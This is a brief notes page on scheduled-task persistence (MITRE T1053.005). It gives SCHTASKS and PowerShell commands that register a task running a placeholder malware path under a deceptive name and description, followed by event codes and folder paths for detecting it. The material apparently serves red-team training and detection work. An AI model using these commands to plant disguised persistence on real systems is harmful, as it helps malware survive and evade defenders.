# [Job Scheduling](https://attack.mitre.org/techniques/T1053/005/)

## Exploit Syntax

### Method 1 | `sharpps` 

```powershell 
sharpps SCHTASKS /CREATE /SC DAILY /TN "MyTasks\Notepad task" /TR "Path to the executable you want to run" /ST 11:00
```
### Method 2 | `pslo`

1. Create a txt file named `schdTask.ps1`

2. Paste in the powershell below and make edits as necessary.

```powershell
$outpath = "<malware file path>"
$action = New-ScheduledTaskAction -Execute $outpath
$days = 'Monday', 'Wednesday', 'Friday'
$trigger = New-ScheduledTaskTrigger -weekly -DaysOfWeek $days -At 11am
Register-ScheduledTask -Action $action -Trigger $trigger -Taskname "Healthy Task" -Description "This task verifies that all other scheduled tasks are legitimate processes."
```
3. Run 'pslo \<schdTask.ps1 file path>' 

---

## Detection Method

* Investigate file creations in the default windows task folder - `C:\Windows\System32\Tasks` folder.
    * Event.code: 1 
    * Event.action: process create 
    * Event.code: 4698 or 4699
    * Event.code: 11 file create
        * Files created within the above folder
    * process.executable: schtasks.exe

*  filter for `C:\Windows\System32\Tasks` and `Event.code: 11 file create`
   *  Will show any new schedule tasks added to the defualt scheduled task folder in windows
---

## Resources